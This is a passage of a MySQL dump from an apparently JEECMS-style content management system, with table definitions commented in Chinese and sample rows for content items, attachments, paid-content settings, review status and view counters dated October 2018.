  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `score` int(11) NOT NULL DEFAULT '0' COMMENT '得分',
  `recommend_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '推荐级别',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_site` (`site_id`),
  KEY `fk_jc_content_type` (`type_id`),
  KEY `fk_jc_content_user` (`user_id`),
  KEY `fk_jc_contentchannel` (`channel_id`),
  KEY `fk_jc_content_model` (`model_id`),
  KEY `index_jc_content_top_level_sort` (`top_level`,`sort_date`),
  KEY `index_jc_content_status` (`status`),
  KEY `index_jc_content_sort_date` (`sort_date`),
  KEY `index_jc_content_is_recommend` (`is_recommend`),
  KEY `index_jc_content_recommend_level` (`recommend_level`),
  CONSTRAINT `fk_jc_content_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
  CONSTRAINT `fk_jc_content_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_content_type` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
  CONSTRAINT `fk_jc_content_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_contentchannel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=190 DEFAULT CHARSET=utf8 COMMENT='CMS内容表';

-- ----------------------------
--  Records of `jc_content`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content` VALUES ('142', '76', '1', '1', '5', '1', '2018-10-18 22:22:25', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('143', '76', '1', '1', '5', '1', '2018-10-18 22:22:43', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('144', '76', '1', '1', '5', '1', '2018-10-18 22:22:54', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('145', '92', '1', '1', '1', '1', '2018-10-18 22:46:23', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('146', '92', '1', '1', '1', '1', '2018-10-18 22:46:52', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('147', '75', '1', '2', '1', '1', '2018-10-18 22:49:39', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('148', '75', '1', '1', '1', '1', '2018-10-18 22:49:49', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('149', '75', '1', '1', '1', '1', '2018-10-18 22:50:01', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('150', '76', '2', '1', '1', '1', '2018-10-19 13:00:51', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('151', '76', '2', '1', '1', '1', '2018-10-19 13:01:28', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('152', '76', '2', '1', '1', '1', '2018-10-19 13:02:41', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('153', '76', '2', '1', '1', '1', '2018-10-19 13:03:53', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('154', '76', '2', '1', '1', '1', '2018-10-19 13:05:57', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('155', '76', '2', '1', '1', '1', '2018-10-19 13:07:16', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('156', '76', '2', '1', '1', '1', '2018-10-19 13:13:26', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('157', '76', '2', '1', '1', '1', '2018-10-19 13:15:25', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('158', '76', '2', '1', '1', '1', '2018-10-19 13:17:13', '0', '0', '0', '3', '0', '0', '0', '0', '0', '1'), ('159', '76', '2', '1', '5', '1', '2018-10-19 13:18:51', '0', '0', '0', '1', '0', '0', '0', '0', '0', '1'), ('160', '104', '1', '2', '1', '1', '2018-10-19 21:15:39', '0', '0', '1', '2', '1', '0', '0', '0', '0', '1'), ('161', '104', '1', '2', '1', '1', '2018-10-19 21:15:48', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1'), ('162', '104', '1', '2', '1', '1', '2018-10-19 21:15:58', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1'), ('163', '95', '1', '2', '1', '1', '2018-10-21 22:50:24', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1'), ('164', '95', '1', '2', '1', '1', '2018-10-21 22:50:41', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1'), ('165', '95', '1', '1', '1', '1', '2018-10-21 22:50:52', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('166', '95', '1', '1', '1', '1', '2018-10-21 22:51:03', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('167', '95', '1', '2', '1', '1', '2018-10-21 22:51:26', '0', '0', '1', '2', '0', '0', '0', '0', '0', '1'), ('168', '95', '1', '1', '1', '1', '2018-10-21 22:51:34', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('169', '95', '1', '1', '1', '1', '2018-10-21 23:02:20', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('170', '95', '1', '1', '1', '1', '2018-10-21 23:02:29', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('171', '95', '1', '2', '1', '1', '2018-10-21 23:02:39', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('172', '95', '1', '1', '1', '1', '2018-10-21 23:02:52', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('173', '94', '1', '2', '1', '1', '2018-10-22 17:30:38', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('174', '94', '1', '1', '1', '1', '2018-10-22 17:31:38', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('175', '94', '1', '1', '1', '1', '2018-10-22 17:32:11', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('176', '94', '1', '1', '1', '1', '2018-10-22 17:42:52', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('177', '94', '1', '1', '1', '1', '2018-10-22 17:43:20', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1'), ('178', '94', '1', '2', '1', '1', '2018-10-22 17:43:49', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1'), ('179', '94', '1', '1', '1', '1', '2018-10-22 17:44:21', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1'), ('180', '94', '1', '1', '1', '1', '2018-10-22 17:46:07', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1'), ('181', '94', '1', '2', '1', '1', '2018-10-22 17:46:30', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1'), ('182', '94', '1', '2', '1', '1', '2018-10-22 17:46:58', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('183', '94', '1', '1', '1', '1', '2018-10-22 17:48:58', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('184', '94', '1', '1', '1', '1', '2018-10-22 17:49:24', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('185', '94', '1', '1', '1', '1', '2018-10-22 17:50:04', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('186', '92', '1', '1', '4', '1', '2018-10-22 18:21:20', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('187', '92', '1', '1', '4', '1', '2018-10-22 18:22:09', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1'), ('188', '92', '1', '1', '4', '1', '2018-10-22 18:23:27', '0', '0', '0', '2', '1', '0', '0', '0', '0', '1'), ('189', '92', '1', '1', '4', '1', '2018-10-22 18:27:16', '0', '0', '0', '2', '0', '0', '0', '0', '0', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_attachment`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_attachment`;
CREATE TABLE `jc_content_attachment` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `attachment_path` varchar(255) NOT NULL COMMENT '附件路径',
  `attachment_name` varchar(100) NOT NULL COMMENT '附件名称',
  `filename` varchar(100) DEFAULT NULL COMMENT '文件名',
  `download_count` int(11) NOT NULL DEFAULT '0' COMMENT '下载次数',
  KEY `fk_jc_attachment_content` (`content_id`),
  CONSTRAINT `fk_jc_attachment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容附件表';

-- ----------------------------
--  Records of `jc_content_attachment`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_attachment` VALUES ('145', '0', '/u/cms/www/201810/18224616n4ar.pdf', '阿里巴巴Java开发手册(终极版).pdf', '阿里巴巴Java开发手册(终极版).pdf', '0'), ('146', '0', '/u/cms/www/201810/18224649ymwj.rar', 'fq.rar', null, '0'), ('186', '0', '/honghe/u/cms/www/201810/22182118gmvc.exe', '360.exe', '360.exe', '0'), ('188', '0', '/honghe/u/cms/www/201810/22182609rm2k.zip', 'ssh_dao-1.0-SNAPSHOT.zip', null, '0'), ('187', '0', '/honghe/u/cms/www/201810/22182636x5u6.zip', 'ssh_dao-1.0-SNAPSHOT.zip', null, '0'), ('189', '0', '/honghe/u/cms/www/201810/22182713b0tb.zip', 'ssh_dao-1.0-SNAPSHOT.zip', null, '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_attr`;
CREATE TABLE `jc_content_attr` (
  `content_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_content` (`content_id`),
  CONSTRAINT `fk_jc_attr_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展属性表';

-- ----------------------------
--  Records of `jc_content_attr`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_attr` VALUES ('145', 'demoUrl', 'http://'), ('145', 'system', ''), ('145', 'size', ''), ('145', 'relatedLink', 'http://'), ('145', 'softType', '国产软件'), ('145', 'edition', ''), ('145', 'warrant', '免费版'), ('145', 'bit', ''), ('146', 'demoUrl', 'http://'), ('146', 'system', ''), ('146', 'size', ''), ('146', 'relatedLink', 'http://'), ('146', 'softType', '国产软件'), ('146', 'edition', ''), ('146', 'warrant', '免费版'), ('146', 'bit', ''), ('186', 'demoUrl', 'http://'), ('186', 'system', ''), ('186', 'size', ''), ('186', 'relatedLink', 'http://'), ('186', 'softType', '国产软件'), ('186', 'edition', ''), ('186', 'warrant', '免费版'), ('186', 'bit', ''), ('187', 'demoUrl', 'http://'), ('187', 'system', ''), ('187', 'size', ''), ('187', 'relatedLink', 'http://'), ('187', 'softType', '国产软件'), ('187', 'edition', ''), ('187', 'warrant', '免费版'), ('187', 'bit', ''), ('188', 'demoUrl', 'http://'), ('188', 'system', ''), ('188', 'size', ''), ('188', 'relatedLink', 'http://'), ('188', 'softType', '国产软件'), ('188', 'edition', ''), ('188', 'warrant', '免费版'), ('188', 'bit', ''), ('189', 'demoUrl', 'http://'), ('189', 'system', ''), ('189', 'size', ''), ('189', 'relatedLink', 'http://'), ('189', 'softType', '国产软件'), ('189', 'edition', ''), ('189', 'warrant', '免费版'), ('189', 'bit', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_buy`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_buy`;
CREATE TABLE `jc_content_buy` (
  `content_buy_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `order_number` varchar(50) NOT NULL DEFAULT '' COMMENT '订单号',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `buy_user_id` int(11) DEFAULT NULL COMMENT '购买用户ID',
  `author_user_id` int(11) NOT NULL COMMENT '笔者ID',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '成交金额',
  `author_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '笔者所得',
  `plat_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '平台所得',
  `buy_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '成交时间',
  `has_paid_author` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否已经结算给作者(0未结算 1已经结算)',
  `order_num_weixin` varchar(255) DEFAULT NULL COMMENT '微信支付订单号',
  `order_num_alipay` varchar(100) DEFAULT NULL COMMENT '支付宝订单号',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '1' COMMENT '模式 1收费 2打赏',
  PRIMARY KEY (`content_buy_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费文章购买记录';

-- ----------------------------
--  Table structure for `jc_content_channel`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_channel`;
CREATE TABLE `jc_content_channel` (
  `channel_id` int(11) NOT NULL,
  `content_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`content_id`),
  KEY `fk_jc_channel_content` (`content_id`),
  CONSTRAINT `fk_jc_channel_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_content_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容栏目关联表';

-- ----------------------------
--  Records of `jc_content_channel`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_channel` VALUES ('76', '142'), ('76', '143'), ('76', '144'), ('92', '145'), ('92', '146'), ('75', '147'), ('75', '148'), ('75', '149'), ('76', '150'), ('76', '151'), ('76', '152'), ('76', '153'), ('76', '154'), ('76', '155'), ('76', '156'), ('76', '157'), ('76', '158'), ('76', '159'), ('104', '160'), ('104', '161'), ('104', '162'), ('95', '163'), ('95', '164'), ('95', '165'), ('95', '166'), ('95', '167'), ('95', '168'), ('95', '169'), ('95', '170'), ('95', '171'), ('95', '172'), ('94', '173'), ('94', '174'), ('94', '175'), ('94', '176'), ('94', '177'), ('94', '178'), ('94', '179'), ('94', '180'), ('94', '181'), ('94', '182'), ('94', '183'), ('94', '184'), ('94', '185'), ('92', '186'), ('92', '187'), ('92', '188'), ('92', '189');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_charge`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_charge`;
CREATE TABLE `jc_content_charge` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '收费金额',
  `total_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '已累计收费',
  `year_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '年金额',
  `month_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '月金额',
  `day_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '0' COMMENT '模式，1收费 2打赏',
  `reward_random_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '随机 最小值',
  `reward_random_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '随机 最大值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT '0' COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费内容配置';

-- ----------------------------
--  Records of `jc_content_charge`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_charge` VALUES ('142', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.00', '1.00', '1'), ('143', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('144', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('145', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('146', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('147', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('148', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('149', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('150', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('151', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('152', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('153', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('154', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('155', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('156', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('157', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('158', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('159', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '1'), ('160', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('161', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('162', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('163', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('164', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('165', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('166', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('167', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('168', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('169', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('170', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('171', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('172', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('173', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('174', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('175', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('176', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('177', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('178', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('179', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('180', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('181', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('182', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('183', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('184', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('185', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('186', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('187', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('188', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0'), ('189', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_check`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_check`;
CREATE TABLE `jc_content_check` (
  `content_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '0' COMMENT '审核步数',
  `check_opinion` varchar(255) DEFAULT NULL COMMENT '审核意见',
  `is_rejected` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否退回',
  `reviewer` int(11) DEFAULT NULL COMMENT '终审者',
  `check_date` datetime DEFAULT NULL COMMENT '终审时间',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_check_user` (`reviewer`),
  CONSTRAINT `fk_jc_check_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_content_check_user` FOREIGN KEY (`reviewer`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容审核信息表';

-- ----------------------------
--  Records of `jc_content_check`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_check` VALUES ('142', '3', null, '0', null, null), ('143', '3', null, '0', null, null), ('144', '3', null, '0', null, null), ('145', '3', null, '0', null, null), ('146', '3', null, '0', null, null), ('147', '3', null, '0', null, null), ('148', '3', null, '0', null, null), ('149', '3', null, '0', null, null), ('150', '3', null, '0', null, null), ('151', '3', null, '0', null, null), ('152', '3', null, '0', null, null), ('153', '3', null, '0', null, null), ('154', '3', null, '0', null, null), ('155', '3', null, '0', null, null), ('156', '3', null, '0', null, null), ('157', '3', null, '0', null, null), ('158', '-1', null, '0', '1', '2018-10-19 13:17:31'), ('159', '2', null, '0', null, null), ('160', '3', null, '0', null, null), ('161', '3', null, '0', null, null), ('162', '3', null, '0', null, null), ('163', '3', null, '0', null, null), ('164', '3', null, '0', null, null), ('165', '3', null, '0', null, null), ('166', '3', null, '0', null, null), ('167', '3', null, '0', null, null), ('168', '3', null, '0', null, null), ('169', '3', null, '0', null, null), ('170', '3', null, '0', null, null), ('171', '3', null, '0', null, null), ('172', '3', null, '0', null, null), ('173', '3', null, '0', null, null), ('174', '3', null, '0', null, null), ('175', '3', null, '0', null, null), ('176', '3', null, '0', null, null), ('177', '3', null, '0', null, null), ('178', '3', null, '0', null, null), ('179', '3', null, '0', null, null), ('180', '3', null, '0', null, null), ('181', '3', null, '0', null, null), ('182', '3', null, '0', null, null), ('183', '3', null, '0', null, null), ('184', '3', null, '0', null, null), ('185', '3', null, '0', null, null), ('186', '3', null, '0', null, null), ('187', '3', null, '0', null, null), ('188', '3', null, '0', null, null), ('189', '3', null, '0', null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_count`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_count`;
CREATE TABLE `jc_content_count` (
  `content_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments` int(11) NOT NULL DEFAULT '0' COMMENT '总评论数',
  `comments_month` int(11) NOT NULL DEFAULT '0' COMMENT '月评论数',
  `comments_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周评论数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads` int(11) NOT NULL DEFAULT '0' COMMENT '总下载数',
  `downloads_month` int(11) NOT NULL DEFAULT '0' COMMENT '月下载数',
  `downloads_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周下载数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups` int(11) NOT NULL DEFAULT '0' COMMENT '总顶数',
  `ups_month` int(11) NOT NULL DEFAULT '0' COMMENT '月顶数',
  `ups_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周顶数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `downs` int(11) NOT NULL DEFAULT '0' COMMENT '总踩数',
  PRIMARY KEY (`content_id`),
  KEY `index_jc_content_count_views_day` (`views_day`),
  KEY `index_jc_content_count_views_week` (`views_week`),
  KEY `index_jc_content_count_views_month` (`views_month`),
  KEY `index_jc_content_count_views` (`views`),
  KEY `index_jc_content_count_comments_day` (`comments_day`),
  KEY `index_jc_content_count_comments_month` (`comments_month`),
  KEY `index_jc_content_count_comments_week` (`comments_week`),
  KEY `index_jc_content_count_comments` (`comments`),
  KEY `index_jc_content_count_downloads_day` (`downloads_day`),
  KEY `index_jc_content_count_downloads_month` (`downloads_month`),
  KEY `index_jc_content_count_downloads_week` (`downloads_week`),
  KEY `index_jc_content_count_downloads` (`downloads`),
  KEY `index_jc_content_count_ups_day` (`ups_day`),
  KEY `index_jc_content_count_ups_week` (`ups_week`),
  KEY `index_jc_content_count_ups_month` (`ups_month`),
  KEY `index_jc_content_count_ups` (`ups`),
  CONSTRAINT `fk_jc_count_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容计数表';

-- ----------------------------
--  Records of `jc_content_count`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_count` VALUES ('142', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('143', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('144', '8', '8', '8', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('145', '6', '6', '6', '0', '0', '0', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '0'), ('146', '2', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('147', '9', '9', '9', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('148', '2', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('149', '2', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('150', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('151', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('152', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('153', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('154', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('155', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('156', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('157', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('158', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('159', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('160', '2', '2', '2', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('161', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('162', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('163', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('164', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('165', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('166', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('167', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('168', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('169', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('170', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('171', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('172', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('173', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('174', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('175', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('176', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('177', '1', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('178', 